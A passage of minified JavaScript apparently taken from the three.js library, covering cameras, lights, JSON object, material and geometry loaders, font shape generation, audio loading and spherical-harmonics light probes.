lr.prototype.copy.call(this,t),this.distance=t.distance,this.decay=t.decay,this.shadow=t.shadow.clone(),this}}),mr.prototype=Object.assign(Object.create($.prototype),{constructor:mr,isOrthographicCamera:!0,copy:function(t,e){return $.prototype.copy.call(this,t,e),this.left=t.left,this.right=t.right,this.top=t.top,this.bottom=t.bottom,this.near=t.near,this.far=t.far,this.zoom=t.zoom,this.view=null===t.view?null:Object.assign({},t.view),this},setViewOffset:function(t,e,i,n,r,a){null===this.view&&(this.view={enabled:!0,fullWidth:1,fullHeight:1,offsetX:0,offsetY:0,width:1,height:1}),this.view.enabled=!0,this.view.fullWidth=t,this.view.fullHeight=e,this.view.offsetX=i,this.view.offsetY=n,this.view.width=r,this.view.height=a,this.updateProjectionMatrix()},clearViewOffset:function(){null!==this.view&&(this.view.enabled=!1),this.updateProjectionMatrix()},updateProjectionMatrix:function(){var t=(this.right-this.left)/(2*this.zoom),e=(this.top-this.bottom)/(2*this.zoom),i=(this.right+this.left)/2,n=(this.top+this.bottom)/2,r=i-t;if(i+=t,t=n+e,e=n-e,null!==this.view&&this.view.enabled){i=this.zoom/(this.view.width/this.view.fullWidth),e=this.zoom/(this.view.height/this.view.fullHeight);var a=(this.right-this.left)/this.view.width;n=(this.top-this.bottom)/this.view.height,i=(r+=this.view.offsetX/i*a)+this.view.width/i*a,e=(t-=this.view.offsetY/e*n)-this.view.height/e*n}this.projectionMatrix.makeOrthographic(r,i,t,e,this.near,this.far),this.projectionMatrixInverse.getInverse(this.projectionMatrix)},toJSON:function(t){return(t=p.prototype.toJSON.call(this,t)).object.zoom=this.zoom,t.object.left=this.left,t.object.right=this.right,t.object.top=this.top,t.object.bottom=this.bottom,t.object.near=this.near,t.object.far=this.far,null!==this.view&&(t.object.view=Object.assign({},this.view)),t}}),gr.prototype=Object.assign(Object.create(hr.prototype),{constructor:gr,isDirectionalLightShadow:!0,updateMatrices:function(t,e,i){hr.prototype.updateMatrices.call(this,t,e,i)}}),vr.prototype=Object.assign(Object.create(lr.prototype),{constructor:vr,isDirectionalLight:!0,copy:function(t){return lr.prototype.copy.call(this,t),this.target=t.target.clone(),this.shadow=t.shadow.clone(),this}}),yr.prototype=Object.assign(Object.create(lr.prototype),{constructor:yr,isAmbientLight:!0}),xr.prototype=Object.assign(Object.create(lr.prototype),{constructor:xr,isRectAreaLight:!0,copy:function(t){return lr.prototype.copy.call(this,t),this.width=t.width,this.height=t.height,this},toJSON:function(t){return(t=lr.prototype.toJSON.call(this,t)).object.width=this.width,t.object.height=this.height,t}}),br.prototype=Object.assign(Object.create(Nn.prototype),{constructor:br,load:function(t,e,i,n){var r=this,a=new kn(r.manager);a.setPath(r.path),a.load(t,(function(t){e(r.parse(JSON.parse(t)))}),i,n)},parse:function(t){function e(t){return void 0===n[t]&&console.warn("THREE.MaterialLoader: Undefined texture",t),n[t]}var n=this.textures,o=new dl[t.type];if(void 0!==t.uuid&&(o.uuid=t.uuid),void 0!==t.name&&(o.name=t.name),void 0!==t.color&&o.color.setHex(t.color),void 0!==t.roughness&&(o.roughness=t.roughness),void 0!==t.metalness&&(o.metalness=t.metalness),void 0!==t.emissive&&o.emissive.setHex(t.emissive),void 0!==t.specular&&o.specular.setHex(t.specular),void 0!==t.shininess&&(o.shininess=t.shininess),void 0!==t.clearcoat&&(o.clearcoat=t.clearcoat),void 0!==t.clearcoatRoughness&&(o.clearcoatRoughness=t.clearcoatRoughness),void 0!==t.vertexColors&&(o.vertexColors=t.vertexColors),void 0!==t.fog&&(o.fog=t.fog),void 0!==t.flatShading&&(o.flatShading=t.flatShading),void 0!==t.blending&&(o.blending=t.blending),void 0!==t.combine&&(o.combine=t.combine),void 0!==t.side&&(o.side=t.side),void 0!==t.opacity&&(o.opacity=t.opacity),void 0!==t.transparent&&(o.transparent=t.transparent),void 0!==t.alphaTest&&(o.alphaTest=t.alphaTest),void 0!==t.depthTest&&(o.depthTest=t.depthTest),void 0!==t.depthWrite&&(o.depthWrite=t.depthWrite),void 0!==t.colorWrite&&(o.colorWrite=t.colorWrite),void 0!==t.wireframe&&(o.wireframe=t.wireframe),void 0!==t.wireframeLinewidth&&(o.wireframeLinewidth=t.wireframeLinewidth),void 0!==t.wireframeLinecap&&(o.wireframeLinecap=t.wireframeLinecap),void 0!==t.wireframeLinejoin&&(o.wireframeLinejoin=t.wireframeLinejoin),void 0!==t.rotation&&(o.rotation=t.rotation),1!==t.linewidth&&(o.linewidth=t.linewidth),void 0!==t.dashSize&&(o.dashSize=t.dashSize),void 0!==t.gapSize&&(o.gapSize=t.gapSize),void 0!==t.scale&&(o.scale=t.scale),void 0!==t.polygonOffset&&(o.polygonOffset=t.polygonOffset),void 0!==t.polygonOffsetFactor&&(o.polygonOffsetFactor=t.polygonOffsetFactor),void 0!==t.polygonOffsetUnits&&(o.polygonOffsetUnits=t.polygonOffsetUnits),void 0!==t.skinning&&(o.skinning=t.skinning),void 0!==t.morphTargets&&(o.morphTargets=t.morphTargets),void 0!==t.morphNormals&&(o.morphNormals=t.morphNormals),void 0!==t.dithering&&(o.dithering=t.dithering),void 0!==t.visible&&(o.visible=t.visible),void 0!==t.toneMapped&&(o.toneMapped=t.toneMapped),void 0!==t.userData&&(o.userData=t.userData),void 0!==t.uniforms)for(var l in t.uniforms){var c=t.uniforms[l];switch(o.uniforms[l]={},c.type){case"t":o.uniforms[l].value=e(c.value);break;case"c":o.uniforms[l].value=(new b).setHex(c.value);break;case"v2":o.uniforms[l].value=(new i).fromArray(c.value);break;case"v3":o.uniforms[l].value=(new r).fromArray(c.value);break;case"v4":o.uniforms[l].value=(new s).fromArray(c.value);break;case"m3":o.uniforms[l].value=(new a).fromArray(c.value);case"m4":o.uniforms[l].value=(new h).fromArray(c.value);break;default:o.uniforms[l].value=c.value}}if(void 0!==t.defines&&(o.defines=t.defines),void 0!==t.vertexShader&&(o.vertexShader=t.vertexShader),void 0!==t.fragmentShader&&(o.fragmentShader=t.fragmentShader),void 0!==t.extensions)for(var u in t.extensions)o.extensions[u]=t.extensions[u];return void 0!==t.shading&&(o.flatShading=1===t.shading),void 0!==t.size&&(o.size=t.size),void 0!==t.sizeAttenuation&&(o.sizeAttenuation=t.sizeAttenuation),void 0!==t.map&&(o.map=e(t.map)),void 0!==t.matcap&&(o.matcap=e(t.matcap)),void 0!==t.alphaMap&&(o.alphaMap=e(t.alphaMap),o.transparent=!0),void 0!==t.bumpMap&&(o.bumpMap=e(t.bumpMap)),void 0!==t.bumpScale&&(o.bumpScale=t.bumpScale),void 0!==t.normalMap&&(o.normalMap=e(t.normalMap)),void 0!==t.normalMapType&&(o.normalMapType=t.normalMapType),void 0!==t.normalScale&&(l=t.normalScale,!1===Array.isArray(l)&&(l=[l,l]),o.normalScale=(new i).fromArray(l)),void 0!==t.displacementMap&&(o.displacementMap=e(t.displacementMap)),void 0!==t.displacementScale&&(o.displacementScale=t.displacementScale),void 0!==t.displacementBias&&(o.displacementBias=t.displacementBias),void 0!==t.roughnessMap&&(o.roughnessMap=e(t.roughnessMap)),void 0!==t.metalnessMap&&(o.metalnessMap=e(t.metalnessMap)),void 0!==t.emissiveMap&&(o.emissiveMap=e(t.emissiveMap)),void 0!==t.emissiveIntensity&&(o.emissiveIntensity=t.emissiveIntensity),void 0!==t.specularMap&&(o.specularMap=e(t.specularMap)),void 0!==t.envMap&&(o.envMap=e(t.envMap)),void 0!==t.envMapIntensity&&(o.envMapIntensity=t.envMapIntensity),void 0!==t.reflectivity&&(o.reflectivity=t.reflectivity),void 0!==t.refractionRatio&&(o.refractionRatio=t.refractionRatio),void 0!==t.lightMap&&(o.lightMap=e(t.lightMap)),void 0!==t.lightMapIntensity&&(o.lightMapIntensity=t.lightMapIntensity),void 0!==t.aoMap&&(o.aoMap=e(t.aoMap)),void 0!==t.aoMapIntensity&&(o.aoMapIntensity=t.aoMapIntensity),void 0!==t.gradientMap&&(o.gradientMap=e(t.gradientMap)),void 0!==t.clearcoatNormalMap&&(o.clearcoatNormalMap=e(t.clearcoatNormalMap)),void 0!==t.clearcoatNormalScale&&(o.clearcoatNormalScale=(new i).fromArray(t.clearcoatNormalScale)),o},setTextures:function(t){return this.textures=t,this}});var _l={decodeText:function(t){if("undefined"!=typeof TextDecoder)return(new TextDecoder).decode(t);for(var e="",i=0,n=t.length;i<n;i++)e+=String.fromCharCode(t[i]);try{return decodeURIComponent(escape(e))}catch(t){return e}},extractUrlBase:function(t){var e=t.lastIndexOf("/");return-1===e?"./":t.substr(0,e+1)}};wr.prototype=Object.assign(Object.create(F.prototype),{constructor:wr,isInstancedBufferGeometry:!0,copy:function(t){return F.prototype.copy.call(this,t),this.maxInstancedCount=t.maxInstancedCount,this},clone:function(){return(new this.constructor).copy(this)},toJSON:function(){var t=F.prototype.toJSON.call(this);return t.maxInstancedCount=this.maxInstancedCount,t.isInstancedBufferGeometry=!0,t}}),_r.prototype=Object.assign(Object.create(C.prototype),{constructor:_r,isInstancedBufferAttribute:!0,copy:function(t){return C.prototype.copy.call(this,t),this.meshPerAttribute=t.meshPerAttribute,this},toJSON:function(){var t=C.prototype.toJSON.call(this);return t.meshPerAttribute=this.meshPerAttribute,t.isInstancedBufferAttribute=!0,t}}),Mr.prototype=Object.assign(Object.create(Nn.prototype),{constructor:Mr,load:function(t,e,i,n){var r=this,a=new kn(r.manager);a.setPath(r.path),a.load(t,(function(t){e(r.parse(JSON.parse(t)))}),i,n)},parse:function(t){var e=t.isInstancedBufferGeometry?new wr:new F,i=t.data.index;if(void 0!==i){var n=new Ml[i.type](i.array);e.setIndex(new C(n,1))}for(var a in i=t.data.attributes){var o=i[a];n=new Ml[o.type](o.array),n=new(o.isInstancedBufferAttribute?_r:C)(n,o.itemSize,o.normalized),void 0!==o.name&&(n.name=o.name),e.addAttribute(a,n)}var s=t.data.morphAttributes;if(s)for(a in s){var l=s[a],c=[];i=0;for(var h=l.length;i<h;i++)o=l[i],n=new C(n=new Ml[o.type](o.array),o.itemSize,o.normalized),void 0!==o.name&&(n.name=o.name),c.push(n);e.morphAttributes[a]=c}if(void 0!==(a=t.data.groups||t.data.drawcalls||t.data.offsets))for(i=0,o=a.length;i!==o;++i)n=a[i],e.addGroup(n.start,n.count,n.materialIndex);return void 0!==(i=t.data.boundingSphere)&&(a=new r,void 0!==i.center&&a.fromArray(i.center),e.boundingSphere=new v(a,i.radius)),t.name&&(e.name=t.name),t.userData&&(e.userData=t.userData),e}});var Ml={Int8Array:Int8Array,Uint8Array:Uint8Array,Uint8ClampedArray:"undefined"!=typeof Uint8ClampedArray?Uint8ClampedArray:Uint8Array,Int16Array:Int16Array,Uint16Array:Uint16Array,Int32Array:Int32Array,Uint32Array:Uint32Array,Float32Array:Float32Array,Float64Array:Float64Array};Sr.prototype=Object.assign(Object.create(Nn.prototype),{constructor:Sr,load:function(t,e,i,n){var r=this,a=""===this.path?_l.extractUrlBase(t):this.path;this.resourcePath=this.resourcePath||a,(a=new kn(r.manager)).setPath(this.path),a.load(t,(function(i){var a=null;try{a=JSON.parse(i)}catch(e){return void 0!==n&&n(e),void console.error("THREE:ObjectLoader: Can't parse "+t+".",e.message)}void 0===(i=a.metadata)||void 0===i.type||"geometry"===i.type.toLowerCase()?console.error("THREE.ObjectLoader: Can't load "+t):r.parse(a,e)}),i,n)},parse:function(t,e){var i=this.parseShape(t.shapes);i=this.parseGeometries(t.geometries,i);var n=this.parseImages(t.images,(function(){void 0!==e&&e(r)}));n=this.parseTextures(t.textures,n),n=this.parseMaterials(t.materials,n);var r=this.parseObject(t.object,i,n);return t.animations&&(r.animations=this.parseAnimations(t.animations)),void 0!==t.images&&0!==t.images.length||void 0===e||e(r),r},parseShape:function(t){var e={};if(void 0!==t)for(var i=0,n=t.length;i<n;i++){var r=(new sr).fromJSON(t[i]);e[r.uuid]=r}return e},parseGeometries:function(t,e){var i={};if(void 0!==t)for(var n=new Mr,r=0,a=t.length;r<a;r++){var o=t[r];switch(o.type){case"PlaneGeometry":case"PlaneBufferGeometry":var s=new ul[o.type](o.width,o.height,o.widthSegments,o.heightSegments);break;case"BoxGeometry":case"BoxBufferGeometry":case"CubeGeometry":s=new ul[o.type](o.width,o.height,o.depth,o.widthSegments,o.heightSegments,o.depthSegments);break;case"CircleGeometry":case"CircleBufferGeometry":s=new ul[o.type](o.radius,o.segments,o.thetaStart,o.thetaLength);break;case"CylinderGeometry":case"CylinderBufferGeometry":s=new ul[o.type](o.radiusTop,o.radiusBottom,o.height,o.radialSegments,o.heightSegments,o.openEnded,o.thetaStart,o.thetaLength);break;case"ConeGeometry":case"ConeBufferGeometry":s=new ul[o.type](o.radius,o.height,o.radialSegments,o.heightSegments,o.openEnded,o.thetaStart,o.thetaLength);break;case"SphereGeometry":case"SphereBufferGeometry":s=new ul[o.type](o.radius,o.widthSegments,o.heightSegments,o.phiStart,o.phiLength,o.thetaStart,o.thetaLength);break;case"DodecahedronGeometry":case"DodecahedronBufferGeometry":case"IcosahedronGeometry":case"IcosahedronBufferGeometry":case"OctahedronGeometry":case"OctahedronBufferGeometry":case"TetrahedronGeometry":case"TetrahedronBufferGeometry":s=new ul[o.type](o.radius,o.detail);break;case"RingGeometry":case"RingBufferGeometry":s=new ul[o.type](o.innerRadius,o.outerRadius,o.thetaSegments,o.phiSegments,o.thetaStart,o.thetaLength);break;case"TorusGeometry":case"TorusBufferGeometry":s=new ul[o.type](o.radius,o.tube,o.radialSegments,o.tubularSegments,o.arc);break;case"TorusKnotGeometry":case"TorusKnotBufferGeometry":s=new ul[o.type](o.radius,o.tube,o.tubularSegments,o.radialSegments,o.p,o.q);break;case"TubeGeometry":case"TubeBufferGeometry":s=new ul[o.type]((new wl[o.path.type]).fromJSON(o.path),o.tubularSegments,o.radius,o.radialSegments,o.closed);break;case"LatheGeometry":case"LatheBufferGeometry":s=new ul[o.type](o.points,o.segments,o.phiStart,o.phiLength);break;case"PolyhedronGeometry":case"PolyhedronBufferGeometry":s=new ul[o.type](o.vertices,o.indices,o.radius,o.details);break;case"ShapeGeometry":case"ShapeBufferGeometry":s=[];for(var l=0,c=o.shapes.length;l<c;l++){var h=e[o.shapes[l]];s.push(h)}s=new ul[o.type](s,o.curveSegments);break;case"ExtrudeGeometry":case"ExtrudeBufferGeometry":for(s=[],l=0,c=o.shapes.length;l<c;l++)h=e[o.shapes[l]],s.push(h);void 0!==(l=o.options.extrudePath)&&(o.options.extrudePath=(new wl[l.type]).fromJSON(l)),s=new ul[o.type](s,o.options);break;case"BufferGeometry":case"InstancedBufferGeometry":s=n.parse(o);break;case"Geometry":"THREE"in window&&"LegacyJSONLoader"in THREE?s=(new THREE.LegacyJSONLoader).parse(o,this.resourcePath).geometry:console.error('THREE.ObjectLoader: You have to import LegacyJSONLoader in order load geometry data of type "Geometry".');break;default:console.warn('THREE.ObjectLoader: Unsupported geometry type "'+o.type+'"');continue}s.uuid=o.uuid,void 0!==o.name&&(s.name=o.name),!0===s.isBufferGeometry&&void 0!==o.userData&&(s.userData=o.userData),i[o.uuid]=s}return i},parseMaterials:function(t,e){var i={},n={};if(void 0!==t){var r=new br;r.setTextures(e),e=0;for(var a=t.length;e<a;e++){var o=t[e];if("MultiMaterial"===o.type){for(var s=[],l=0;l<o.materials.length;l++){var c=o.materials[l];void 0===i[c.uuid]&&(i[c.uuid]=r.parse(c)),s.push(i[c.uuid])}n[o.uuid]=s}else void 0===i[o.uuid]&&(i[o.uuid]=r.parse(o)),n[o.uuid]=i[o.uuid]}}return n},parseAnimations:function(t){for(var e=[],i=0;i<t.length;i++){var n=t[i],r=In.parse(n);void 0!==n.uuid&&(r.uuid=n.uuid),e.push(r)}return e},parseImages:function(t,e){function i(t){return n.manager.itemStart(t),a.load(t,(function(){n.manager.itemEnd(t)}),void 0,(function(){n.manager.itemError(t),n.manager.itemEnd(t)}))}var n=this,r={};if(void 0!==t&&0<t.length){var a=new Gn(e=new Dn(e));a.setCrossOrigin(this.crossOrigin),e=0;for(var o=t.length;e<o;e++){var s=t[e],l=s.url;if(Array.isArray(l)){r[s.uuid]=[];for(var c=0,h=l.length;c<h;c++){var u=l[c];u=/^(\/\/)|([a-z]+:(\/\/)?)/i.test(u)?u:n.resourcePath+u,r[s.uuid].push(i(u))}}else u=/^(\/\/)|([a-z]+:(\/\/)?)/i.test(s.url)?s.url:n.resourcePath+s.url,r[s.uuid]=i(u)}}return r},parseTextures:function(t,e){function i(t,e){return"number"==typeof t?t:(console.warn("THREE.ObjectLoader.parseTexture: Constant should be in numeric form.",t),e[t])}var n={};if(void 0!==t)for(var r=0,a=t.length;r<a;r++){var s=t[r];void 0===s.image&&console.warn('THREE.ObjectLoader: No "image" specified for',s.uuid),void 0===e[s.image]&&console.warn("THREE.ObjectLoader: Undefined image",s.image);var l=Array.isArray(e[s.image])?new vt(e[s.image]):new o(e[s.image]);l.needsUpdate=!0,l.uuid=s.uuid,void 0!==s.name&&(l.name=s.name),void 0!==s.mapping&&(l.mapping=i(s.mapping,Sl)),void 0!==s.offset&&l.offset.fromArray(s.offset),void 0!==s.repeat&&l.repeat.fromArray(s.repeat),void 0!==s.center&&l.center.fromArray(s.center),void 0!==s.rotation&&(l.rotation=s.rotation),void 0!==s.wrap&&(l.wrapS=i(s.wrap[0],Tl),l.wrapT=i(s.wrap[1],Tl)),void 0!==s.format&&(l.format=s.format),void 0!==s.type&&(l.type=s.type),void 0!==s.encoding&&(l.encoding=s.encoding),void 0!==s.minFilter&&(l.minFilter=i(s.minFilter,El)),void 0!==s.magFilter&&(l.magFilter=i(s.magFilter,El)),void 0!==s.anisotropy&&(l.anisotropy=s.anisotropy),void 0!==s.flipY&&(l.flipY=s.flipY),void 0!==s.premultiplyAlpha&&(l.premultiplyAlpha=s.premultiplyAlpha),void 0!==s.unpackAlignment&&(l.unpackAlignment=s.unpackAlignment),n[s.uuid]=l}return n},parseObject:function(t,e,i){function n(t){return void 0===e[t]&&console.warn("THREE.ObjectLoader: Undefined geometry",t),e[t]}function r(t){if(void 0!==t){if(Array.isArray(t)){for(var e=[],n=0,r=t.length;n<r;n++){var a=t[n];void 0===i[a]&&console.warn("THREE.ObjectLoader: Undefined material",a),e.push(i[a])}return e}return void 0===i[t]&&console.warn("THREE.ObjectLoader: Undefined material",t),i[t]}}switch(t.type){case"Scene":var a=new f;void 0!==t.background&&Number.isInteger(t.background)&&(a.background=new b(t.background)),void 0!==t.fog&&("Fog"===t.fog.type?a.fog=new Be(t.fog.color,t.fog.near,t.fog.far):"FogExp2"===t.fog.type&&(a.fog=new ke(t.fog.color,t.fog.density)));break;case"PerspectiveCamera":a=new Z(t.fov,t.aspect,t.near,t.far),void 0!==t.focus&&(a.focus=t.focus),void 0!==t.zoom&&(a.zoom=t.zoom),void 0!==t.filmGauge&&(a.filmGauge=t.filmGauge),void 0!==t.filmOffset&&(a.filmOffset=t.filmOffset),void 0!==t.view&&(a.view=Object.assign({},t.view));break;case"OrthographicCamera":a=new mr(t.left,t.right,t.top,t.bottom,t.near,t.far),void 0!==t.zoom&&(a.zoom=t.zoom),void 0!==t.view&&(a.view=Object.assign({},t.view));break;case"AmbientLight":a=new yr(t.color,t.intensity);break;case"DirectionalLight":a=new vr(t.color,t.intensity);break;case"PointLight":a=new fr(t.color,t.intensity,t.distance,t.decay);break;case"RectAreaLight":a=new xr(t.color,t.intensity,t.width,t.height);break;case"SpotLight":a=new dr(t.color,t.intensity,t.distance,t.angle,t.penumbra,t.decay);break;case"HemisphereLight":a=new cr(t.color,t.groundColor,t.intensity);break;case"SkinnedMesh":console.warn("THREE.ObjectLoader.parseObject() does not support SkinnedMesh yet.");case"Mesh":a=n(t.geometry);var o=r(t.material);a=a.bones&&0<a.bones.length?new We(a,o):new H(a,o),void 0!==t.drawMode&&a.setDrawMode(t.drawMode);break;case"LOD":a=new Ve;break;case"Line":a=new $e(n(t.geometry),r(t.material),t.mode);break;case"LineLoop":a=new Je(n(t.geometry),r(t.material));break;case"LineSegments":a=new Ze(n(t.geometry),r(t.material));break;case"PointCloud":case"Points":a=new Qe(n(t.geometry),r(t.material));break;case"Sprite":a=new je(r(t.material));break;case"Group":a=new Re;break;default:a=new p}if(a.uuid=t.uuid,void 0!==t.name&&(a.name=t.name),void 0!==t.matrix?(a.matrix.fromArray(t.matrix),void 0!==t.matrixAutoUpdate&&(a.matrixAutoUpdate=t.matrixAutoUpdate),a.matrixAutoUpdate&&a.matrix.decompose(a.position,a.quaternion,a.scale)):(void 0!==t.position&&a.position.fromArray(t.position),void 0!==t.rotation&&a.rotation.fromArray(t.rotation),void 0!==t.quaternion&&a.quaternion.fromArray(t.quaternion),void 0!==t.scale&&a.scale.fromArray(t.scale)),void 0!==t.castShadow&&(a.castShadow=t.castShadow),void 0!==t.receiveShadow&&(a.receiveShadow=t.receiveShadow),t.shadow&&(void 0!==t.shadow.bias&&(a.shadow.bias=t.shadow.bias),void 0!==t.shadow.radius&&(a.shadow.radius=t.shadow.radius),void 0!==t.shadow.mapSize&&a.shadow.mapSize.fromArray(t.shadow.mapSize),void 0!==t.shadow.camera&&(a.shadow.camera=this.parseObject(t.shadow.camera))),void 0!==t.visible&&(a.visible=t.visible),void 0!==t.frustumCulled&&(a.frustumCulled=t.frustumCulled),void 0!==t.renderOrder&&(a.renderOrder=t.renderOrder),void 0!==t.userData&&(a.userData=t.userData),void 0!==t.layers&&(a.layers.mask=t.layers),void 0!==t.children){o=t.children;for(var s=0;s<o.length;s++)a.add(this.parseObject(o[s],e,i))}if("LOD"===t.type)for(t=t.levels,o=0;o<t.length;o++){s=t[o];var l=a.getObjectByProperty("uuid",s.object);void 0!==l&&a.addLevel(l,s.distance)}return a}});var Sl={UVMapping:300,CubeReflectionMapping:301,CubeRefractionMapping:302,EquirectangularReflectionMapping:303,EquirectangularRefractionMapping:304,SphericalReflectionMapping:305,CubeUVReflectionMapping:306,CubeUVRefractionMapping:307},Tl={RepeatWrapping:1e3,ClampToEdgeWrapping:1001,MirroredRepeatWrapping:1002},El={NearestFilter:1003,NearestMipmapNearestFilter:1004,NearestMipmapLinearFilter:1005,LinearFilter:1006,LinearMipmapNearestFilter:1007,LinearMipmapLinearFilter:1008};Tr.prototype=Object.assign(Object.create(Nn.prototype),{constructor:Tr,setOptions:function(t){return this.options=t,this},load:function(t,e,i,n){void 0===t&&(t=""),void 0!==this.path&&(t=this.path+t),t=this.manager.resolveURL(t);var r=this,a=fl.get(t);if(void 0!==a)return r.manager.itemStart(t),setTimeout((function(){e&&e(a),r.manager.itemEnd(t)}),0),a;fetch(t).then((function(t){return t.blob()})).then((function(t){return void 0===r.options?createImageBitmap(t):createImageBitmap(t,r.options)})).then((function(i){fl.add(t,i),e&&e(i),r.manager.itemEnd(t)})).catch((function(e){n&&n(e),r.manager.itemError(t),r.manager.itemEnd(t)})),r.manager.itemStart(t)}}),Object.assign(Er.prototype,{moveTo:function(t,e){this.currentPath=new or,this.subPaths.push(this.currentPath),this.currentPath.moveTo(t,e)},lineTo:function(t,e){this.currentPath.lineTo(t,e)},quadraticCurveTo:function(t,e,i,n){this.currentPath.quadraticCurveTo(t,e,i,n)},bezierCurveTo:function(t,e,i,n,r,a){this.currentPath.bezierCurveTo(t,e,i,n,r,a)},splineThru:function(t){this.currentPath.splineThru(t)},toShapes:function(t,e){function i(t){for(var e=[],i=0,n=t.length;i<n;i++){var r=t[i],a=new sr;a.curves=r.curves,e.push(a)}return e}function n(t,e){for(var i=e.length,n=!1,r=i-1,a=0;a<i;r=a++){var o=e[r],s=e[a],l=s.x-o.x,c=s.y-o.y;if(Math.abs(c)>Number.EPSILON){if(0>c&&(o=e[a],l=-l,s=e[r],c=-c),!(t.y<o.y||t.y>s.y))if(t.y===o.y){if(t.x===o.x)return!0}else{if(0===(r=c*(t.x-o.x)-l*(t.y-o.y)))return!0;0>r||(n=!n)}}else if(t.y===o.y&&(s.x<=t.x&&t.x<=o.x||o.x<=t.x&&t.x<=s.x))return!0}return n}var r=cl.isClockWise,a=this.subPaths;if(0===a.length)return[];if(!0===e)return i(a);if(e=[],1===a.length){var o=a[0],s=new sr;return s.curves=o.curves,e.push(s),e}var l=!r(a[0].getPoints());l=t?!l:l,s=[];var c=[],h=[],u=0;c[u]=void 0,h[u]=[];for(var d=0,p=a.length;d<p;d++){var f=(o=a[d]).getPoints(),m=r(f);(m=t?!m:m)?(!l&&c[u]&&u++,c[u]={s:new sr,p:f},c[u].s.curves=o.curves,l&&u++,h[u]=[]):h[u].push({h:o,p:f[0]})}if(!c[0])return i(a);if(1<c.length){for(d=!1,t=[],r=0,a=c.length;r<a;r++)s[r]=[];for(r=0,a=c.length;r<a;r++)for(o=h[r],m=0;m<o.length;m++){for(l=o[m],u=!0,f=0;f<c.length;f++)n(l.p,c[f].p)&&(r!==f&&t.push({froms:r,tos:f,hole:m}),u?(u=!1,s[f].push(l)):d=!0);u&&s[r].push(l)}0<t.length&&(d||(h=s))}for(d=0,r=c.length;d<r;d++)for(s=c[d].s,e.push(s),a=0,o=(t=h[d]).length;a<o;a++)s.holes.push(t[a].h);return e}}),Object.assign(Cr.prototype,{isFont:!0,generateShapes:function(t,e){void 0===e&&(e=100);var i=[],n=e;e=this.data;var r=Array.from?Array.from(t):String(t).split("");n/=e.resolution;var a=(e.boundingBox.yMax-e.boundingBox.yMin+e.underlineThickness)*n;t=[];for(var o=0,s=0,l=0;l<r.length;l++){var c=r[l];if("\n"===c)o=0,s-=a;else{var h=c;c=n;var u=o,d=s,p=e,f=p.glyphs[h]||p.glyphs["?"];if(f){if(h=new Er,f.o)for(var m=0,g=(p=f._cachedOutline||(f._cachedOutline=f.o.split(" "))).length;m<g;)switch(p[m++]){case"m":var v=p[m++]*c+u,y=p[m++]*c+d;h.moveTo(v,y);break;case"l":v=p[m++]*c+u,y=p[m++]*c+d,h.lineTo(v,y);break;case"q":var x=p[m++]*c+u,b=p[m++]*c+d,w=p[m++]*c+u,_=p[m++]*c+d;h.quadraticCurveTo(w,_,x,b);break;case"b":x=p[m++]*c+u,b=p[m++]*c+d,w=p[m++]*c+u,_=p[m++]*c+d,v=p[m++]*c+u,y=p[m++]*c+d,h.bezierCurveTo(w,_,v,y,x,b)}c={offsetX:f.ha*c,path:h}}else console.error('THREE.Font: character "'+h+'" does not exists in font family '+p.familyName+"."),c=void 0;o+=c.offsetX,t.push(c.path)}}for(e=0,r=t.length;e<r;e++)Array.prototype.push.apply(i,t[e].toShapes());return i}}),Ar.prototype=Object.assign(Object.create(Nn.prototype),{constructor:Ar,load:function(t,e,i,n){var r=this,a=new kn(this.manager);a.setPath(this.path),a.load(t,(function(t){try{var i=JSON.parse(t)}catch(e){console.warn("THREE.FontLoader: typeface.js support is being deprecated. Use typeface.json instead."),i=JSON.parse(t.substring(65,t.length-2))}t=r.parse(i),e&&e(t)}),i,n)},parse:function(t){return new Cr(t)}});var Cl,Al={getContext:function(){return void 0===Cl&&(Cl=new(window.AudioContext||window.webkitAudioContext)),Cl},setContext:function(t){Cl=t}};Lr.prototype=Object.assign(Object.create(Nn.prototype),{constructor:Lr,load:function(t,e,i,n){var r=new kn(this.manager);r.setResponseType("arraybuffer"),r.setPath(this.path),r.load(t,(function(t){t=t.slice(0),Al.getContext().decodeAudioData(t,(function(t){e(t)}))}),i,n)}}),Object.assign(Pr.prototype,{isSphericalHarmonics3:!0,set:function(t){for(var e=0;9>e;e++)this.coefficients[e].copy(t[e]);return this},zero:function(){for(var t=0;9>t;t++)this.coefficients[t].set(0,0,0);return this},getAt:function(t,e){var i=t.x,n=t.y;t=t.z;var r=this.coefficients;return e.copy(r[0]).multiplyScalar(.282095),e.addScale(r[1],.488603*n),e.addScale(r[2],.488603*t),e.addScale(r[3],.488603*i),e.addScale(r[4],1.092548*i*n),e.addScale(r[5],1.092548*n*t),e.addScale(r[6],.315392*(3*t*t-1)),e.addScale(r[7],1.092548*i*t),e.addScale(r[8],.546274*(i*i-n*n)),e},getIrradianceAt:function(t,e){var i=t.x,n=t.y;t=t.z;var r=this.coefficients;return e.copy(r[0]).multiplyScalar(.886227),e.addScale(r[1],1.023328*n),e.addScale(r[2],1.023328*t),e.addScale(r[3],1.023328*i),e.addScale(r[4],.858086*i*n),e.addScale(r[5],.858086*n*t),e.addScale(r[6],.743125*t*t-.247708),e.addScale(r[7],.858086*i*t),e.addScale(r[8],.429043*(i*i-n*n)),e},add:function(t){for(var e=0;9>e;e++)this.coefficients[e].add(t.coefficients[e]);return this},scale:function(t){for(var e=0;9>e;e++)this.coefficients[e].multiplyScalar(t);return this},lerp:function(t,e){for(var i=0;9>i;i++)this.coefficients[i].lerp(t.coefficients[i],e);return this},equals:function(t){for(var e=0;9>e;e++)if(!this.coefficients[e].equals(t.coefficients[e]))return!1;return!0},copy:function(t){return this.set(t.coefficients)},clone:function(){return(new this.constructor).copy(this)},fromArray:function(t,e){void 0===e&&(e=0);for(var i=this.coefficients,n=0;9>n;n++)i[n].fromArray(t,e+3*n);return this},toArray:function(t,e){void 0===t&&(t=[]),void 0===e&&(e=0);for(var i=this.coefficients,n=0;9>n;n++)i[n].toArray(t,e+3*n);return t}}),Object.assign(Pr,{getBasisAt:function(t,e){var i=t.x,n=t.y;t=t.z,e[0]=.282095,e[1]=.488603*n,e[2]=.488603*t,e[3]=.488603*i,e[4]=1.092548*i*n,e[5]=1.092548*n*t,e[6]=.315392*(3*t*t-1),e[7]=1.092548*i*t,e[8]=.546274*(i*i-n*n)}}),Rr.prototype=Object.assign(Object.create(lr.prototype),{constructor:Rr,isLightProbe:!0,copy:function(t){return lr.prototype.copy.call(this,t),this.sh.copy(t.sh),this.intensity=t.intensity,this},toJSON:function(t){return 